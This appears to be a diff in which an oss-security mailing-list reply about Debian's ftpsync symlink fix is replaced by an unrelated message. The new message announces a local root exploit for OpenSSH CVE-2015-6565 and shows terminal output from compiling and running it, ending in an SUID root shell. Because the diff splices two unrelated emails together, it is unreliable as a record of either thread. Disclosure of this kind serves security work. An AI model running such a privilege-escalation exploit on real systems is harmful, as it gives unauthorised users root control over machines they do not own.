@@ -1,34 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/10/19/4
-Message-ID: <20171019194428.GK20315@hunt>
-Date: Thu, 19 Oct 2017 12:44:28 -0700
-From: Seth Arnold <seth.arnold@...onical.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/26/2
+Message-ID: <20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>
+Date: Thu, 26 Jan 2017 10:07:24 +0100
+From: up201407890@...nos.dcc.fc.up.pt
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2017-8805: Unsafe symlinks not filtered in Debian mirror script ftpsync
+Subject: Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local  privesc on Linux
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Oct 18, 2017 at 04:55:07PM -0400, Robert Watson wrote:
-> Removing the ability for rsync to copy symlinks pointing to targets outside
-> the mirror tree would greatly cripple it. I need to understand how the
-> danger is worth the loss of this functionality.
+Hi list,
 
-Note that the fix isn't modifying rsync, the fix is modifying the ftpsync
-script that calls rsync:
+I know I'm late to the party, but I was bored, so I decided to write  
+an exploit for CVE-2015-6565 which affects OpenSSH 6.8-6.9
+It is mostly considered to be a "DoS", even though Jann Horn publicly  
+told how it could be exploited for local privilege escalation, but I  
+guess its either PoC||GTFO for users to update.
 
-+    RSYNC_OPTIONS=${RSYNC_OPTIONS:-"-prltvHSB8192 --safe-links --timeout 3600 --stats --no-human-readable"}
+ From https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6565
 
-https://anonscm.debian.org/cgit/mirror/archvsync.git/commit/?id=d1ca2ab2210990b6dfb664cd6776a41b71c48016
+"sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY  
+devices, which allows local users to cause a denial of service  
+(terminal disruption) or possibly have unspecified other impact by  
+writing to a device, as demonstrated by writing an escape sequence."
 
-Of course for people who run this mirroring tool as a specific user
-account and set file permissions appropriately this is more or less a
-no-op. But this is a useful hardening for people who run the ftpsync
-command as a user with too many privileges. (I wouldn't have bothered
-filing for a CVE for this change; I see it as a simple hardening change.)
+I think the description should be updated.
 
-This option shouldn't cripple ftpsync as a well-run repository is highly
-unlikely to have symlinks pointing out of the tree. A repository with
-symlinks pointing out of the tree is already not a suitable rsync source.
+$ gcc not_an_sshnuke.c -o not_an_sshnuke
+$ ./not_an_sshnuke /dev/pts/3
+[*] Waiting for slave device /dev/pts/3
+[+] Got PTY slave /dev/pts/3
+[+] Making PTY slave the controlling terminal
+[+] SUID shell at /tmp/sh
+$ /tmp/sh --norc --noprofile -p
+# id
+euid=0(root) groups=0(root)
 
-Thanks
+Thanks,
+Federico Bento.
 
-Download attachment "signature.asc" of type "application/pgp-signature" (474 bytes)
+
+
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
+
+View attachment "not_an_sshnuke.c" of type "text/x-csrc" (2039 bytes)
